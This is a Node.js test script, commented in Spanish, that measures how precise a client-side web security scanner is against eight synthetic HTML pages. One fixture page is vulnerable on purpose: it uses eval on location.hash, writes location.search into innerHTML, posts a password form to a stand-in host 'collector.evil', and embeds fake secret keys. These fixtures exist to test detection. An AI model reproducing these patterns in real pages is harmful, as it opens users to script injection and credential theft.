import { JSDOM } from 'jsdom';
import fs from 'fs';
import vm from 'node:vm';

const html = fs.readFileSync(new URL('../index.html', import.meta.url), 'utf8');
const js = /<script>([\s\S]*?)<\/script>/.exec(html)[1];

/* extract a top-level `function NAME(...)` with brace matching */
function extractFn(name) {
  const i = js.indexOf(`function ${name}(`);
  if (i < 0) throw new Error(`function ${name} not found`);
  let depth = 0, j = js.indexOf('{', i);
  for (let k = j; k < js.length; k++) {
    if (js[k] === '{') depth++;
    else if (js[k] === '}') { depth--; if (!depth) return js.slice(i, k + 1); }
  }
  throw new Error(`unbalanced braces in ${name}`);
}
function extractConst(name) {
  const i = js.indexOf(`const ${name}`);
  if (i < 0) throw new Error(`const ${name} not found`);
  let j = js.indexOf('=', i), depth = 0, started = false;
  for (let k = j; k < js.length; k++) {
    const c = js[k];
    if (c === '[' || c === '{') { depth++; started = true; }
    else if (c === ']' || c === '}') depth--;
    else if (c === ';' && started && depth === 0) return js.slice(i, k + 1);
  }
  throw new Error(`unterminated const ${name}`);
}

const escLine = js.split('\n').find(l => l.startsWith('const esc ='));
const pieces = [
  escLine,
  extractFn('hostOf'), extractFn('absProto'), extractFn('isExternal'),
  extractConst('SEV_ORDER'), extractConst('CSP_DIRECTIVES'), extractFn('analyzeCSP'),
  extractConst('CODE_RULES'), extractFn('clean'), extractFn('lineOf'), extractFn('scanCode'),
  extractFn('analyzePage'),
].join('\n\n');

/* run inside a jsdom window so DOMParser is real */
const dom = new JSDOM('<!doctype html><p>host</p>', { runScripts: 'outside-only', url: 'https://host.test/' });
const ctx = dom.getInternalVMContext();
vm.runInContext(pieces + '\nglobalThis.__analyzePage = analyzePage;', ctx);
const analyze = (pageHtml, baseUrl) => ctx.__analyzePage(pageHtml, new URL(baseUrl));

let pass = 0, fail = 0;
const ok = n => { console.log(`  ✅ ${n}`); pass++; };
const no = (n, d) => { console.log(`  ❌ ${n}${d ? '\n       → ' + d : ''}`); fail++; };
const titles = F => F.map(f => f.title).join(' | ');

console.log('\n═══════════════════════════════════════════════════════════');
console.log('  Escáner SAST — precisión sobre corpus de páginas realistas');
console.log('═══════════════════════════════════════════════════════════\n');

/* ── CORPUS 1: página moderna BIEN configurada — no debe gritar ── */
console.log('C1 · Página limpia y moderna (Astro/estático bien hecho)');
{
  const page = `<!doctype html><html lang="es"><head><meta charset="utf-8">
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; object-src 'none'; base-uri 'self'; frame-ancestors 'none'">
<meta name="referrer" content="strict-origin-when-cross-origin">
<link rel="stylesheet" href="/assets/site.css">
<script src="/assets/app.js" defer></script>
</head><body>
<h1>Panel de usuario</h1>
<p>Escribe tu contraseña para continuar. Task-force skills: risk-assessment.</p>
<form action="/login" method="post"><input type="password" name="p"><button>Entrar</button></form>
<a href="https://docs.example.com" target="_blank" rel="noopener noreferrer">Docs</a>
<img src="/logo.png" alt="logo">
<!-- layout container -->
</body></html>`;
  const F = analyze(page, 'https://clean.example.com/');
  const noisy = F.filter(f => ['crit', 'high'].includes(f.severity));
  if (!noisy.length) ok('cero hallazgos crit/high (la palabra "contraseña" en prosa no dispara nada)');
  else no('cero crit/high en página limpia', titles(noisy));
  const secrets = F.filter(f => f.cat === 'secrets');
  if (!secrets.length) ok('cero falsos secretos');
  else no('cero falsos secretos', titles(secrets));
}

/* ── CORPUS 2: diccionario i18n — el FP que sospecho ── */
console.log('\nC2 · Diccionario de traducciones i18n (trampa de falso positivo)');
{
  const page = `<!doctype html><html lang="es"><head><meta charset="utf-8">
<meta http-equiv="Content-Security-Policy" content="default-src 'self'"></head><body>
<script src="/app.js"></script>
<script type="application/json" id="i18n">
{"login":{"username":"Nombre de usuario","password":"Introduce tu contraseña","passwordHint":"La contraseña debe tener 8 caracteres"}}
</script>
</body></html>`;
  const F = analyze(page, 'https://i18n.example.com/');
  const secretFPs = F.filter(f => f.cat === 'secrets' && /secreto|password/i.test(f.title));
  if (!secretFPs.length) ok('las cadenas i18n "password": "Introduce tu contraseña" NO se marcan como secreto');
  else no('i18n no dispara "Posible secreto"', titles(secretFPs));
}

/* ── CORPUS 3: página vulnerable de verdad — recall ── */
console.log('\nC3 · Página genuinamente vulnerable (recall)');
{
  const page = `<!doctype html><html><head>
<script src="http://cdn.legacy.com/jquery-1.8.2.min.js"></script>
<meta name="generator" content="WordPress 4.9">
</head><body onload="init()">
<script>
  var stripeKey = "sk-Live4eC39HqLyjWDarjtT1zdp7dc";
  var aws = "AKIAIOSFODNN7EXAMPLE";
  var cfg = { api_key: "9f8e7d6c5b4a39281706fedcba" };
  eval(location.hash.slice(1));
  document.getElementById('out').innerHTML = location.search;
</script>
<a href="http://old.site" target="_blank">viejo</a>
<form action="http://collector.evil/submit"><input type="password"></form>
<iframe src="https://ads.thirdparty.net/frame"></iframe>
<!-- TODO: quitar password hardcodeada antes de producción -->
</body></html>`;
  const F = analyze(page, 'http://vulnerable.example.com/');
  const has = (re) => F.some(f => re.test(f.title));
  const expects = [
    ['HTTP sin cifrar', /HTTP sin cifrar/],
    ['clave sk- de Stripe/OpenAI', /sk-/],
    ['Access Key de AWS', /AWS/],
    ['api_key genérica', /secreto en el código/i],
    ['eval() en JS inline', /eval/i],
    ['innerHTML con datos externos', /innerHTML|inyección/i],
    ['formulario de contraseña por HTTP', /contraseña.*HTTP|HTTP.*contraseña/i],
    ['target=_blank sin noopener', /noopener/],
    ['jQuery 1.x desactualizado', /jQuery desactualizado/],
    ['WordPress fingerprint', /WordPress/],
    ['sin CSP', /Content-Security-Policy/],
    ['comentario con "password"', /Comentarios HTML/],
    ['manejador onload inline', /Manejadores de eventos/],
    ['iframe de tercero sin sandbox', /sandbox/],
  ];
  for (const [name, re] of expects) {
    if (has(re)) ok(`detecta: ${name}`); else no(`detecta: ${name}`, titles(F).slice(0, 200));
  }
}

/* ── CORPUS 4: trampas de secretos — cosas que PARECEN claves ── */
console.log('\nC4 · Cadenas que parecen secretos pero no lo son');
{
  const page = `<!doctype html><html lang="en"><head><meta charset="utf-8">
<meta http-equiv="Content-Security-Policy" content="default-src 'self'"></head><body>
<script src="/app.js"></script>
<div data-testid="sk-panel">риск-менеджмент</div>
<code>npm install @sk-toolkit/core</code>
<p>El hash del commit es 4eC39HqLyjWDarjtT1zdp7dc y el build task-123.</p>
<script type="application/ld+json">{"@id":"https://ex.com/#sk-widget"}</script>
</body></html>`;
  const F = analyze(page, 'https://traps.example.com/');
  const skFPs = F.filter(f => /sk-/.test(f.title));
  if (!skFPs.length) ok('"sk-panel", "@sk-toolkit" y "#sk-widget" NO disparan la regla de claves sk-');
  else no('nombres con "sk-" cortos no disparan', titles(skFPs));
}

/* ── CORPUS 5: JWT legítimo en atributo vs expuesto ── */
console.log('\nC5 · Detección de JWT');
{
  const jwt = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4ifQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJVadQssw5c';
  const page = `<!doctype html><html lang="en"><head><meta charset="utf-8">
<meta http-equiv="Content-Security-Policy" content="default-src 'self'"></head><body>
<script src="/a.js"></script>
<script>var session = "${jwt}";</script>
</body></html>`;
  const F = analyze(page, 'https://jwt.example.com/');
  if (F.some(f => /JWT/.test(f.title))) ok('un JWT incrustado en el HTML se detecta');
  else no('JWT incrustado detectado', titles(F));
}

/* ── CORPUS 6: SRI — distinguir primera parte de tercera ── */
console.log('\nC6 · SRI: same-origin no cuenta, cross-origin sí');
{
  const page = `<!doctype html><html lang="en"><head><meta charset="utf-8">
<meta http-equiv="Content-Security-Policy" content="default-src 'self'">
<script src="/local/app.js"></script>
<script src="https://cdn.jsdelivr.net/npm/lib@1/dist/lib.min.js"></script>
<script src="https://unpkg.com/other@2/index.js" integrity="sha384-AAAA" crossorigin="anonymous"></script>
</head><body></body></html>`;
  const F = analyze(page, 'https://sri.example.com/');
  const sri = F.find(f => /Scripts de terceros sin integridad/.test(f.title));
  if (sri && /\(1\)/.test(sri.title)) ok('cuenta exactamente 1 script de terceros sin SRI (jsdelivr; unpkg tiene integrity, /local es propio)');
  else no('conteo SRI exacto', sri ? sri.title : 'regla no disparó');
}

/* ── CORPUS 7: mixed content sólo en HTTPS ── */
console.log('\nC7 · Contenido mixto');
{
  const mixed = `<!doctype html><html lang="en"><head><meta charset="utf-8">
<meta http-equiv="Content-Security-Policy" content="default-src 'self'">
<script src="http://cdn.x.com/a.js"></script>
<link rel="stylesheet" href="http://cdn.x.com/a.css">
</head><body><img src="http://img.x.com/p.jpg"></body></html>`;
  let F = analyze(mixed, 'https://mixed.example.com/');
  const act = F.find(f => /mixto activo/.test(f.title));
  const pas = F.find(f => /mixto pasivo/.test(f.title));
  if (act && /\(2\)/.test(act.title)) ok('activo: script+css por HTTP = 2'); else no('mixto activo = 2', act && act.title);
  if (pas && /\(1\)/.test(pas.title)) ok('pasivo: img por HTTP = 1'); else no('mixto pasivo = 1', pas && pas.title);

  F = analyze(mixed, 'http://mixed.example.com/');
  if (!F.some(f => /mixto/.test(f.title))) ok('en páginas HTTP no se reporta contenido mixto (no aplica)');
  else no('sin mixto en HTTP');
}

/* ── CORPUS 8: página HTTPS sin nada inline pero con handler React-style ── */
console.log('\nC8 · Atributos que parecen handlers pero no lo son');
{
  const page = `<!doctype html><html lang="en"><head><meta charset="utf-8">
<meta http-equiv="Content-Security-Policy" content="default-src 'self'"></head><body>
<script src="/app.js"></script>
<div once="true" online-status="ok" data-onboarding="step1">x</div>
<button onclick="go()">real</button>
</body></html>`;
  const F = analyze(page, 'https://attrs.example.com/');
  const h = F.find(f => /Manejadores de eventos/.test(f.title));
  if (h && /\(1\)/.test(h.title)) ok('solo onclick cuenta; once/online-status/data-onboarding no');
  else no('conteo de handlers exacto', h ? h.title : 'no disparó');
}

console.log('\n═══════════════════════════════════════════════════════════');
console.log(`  RESULTADO:  ${pass} pasan   ${fail} fallan`);
console.log('═══════════════════════════════════════════════════════════\n');
process.exit(fail ? 1 : 0);
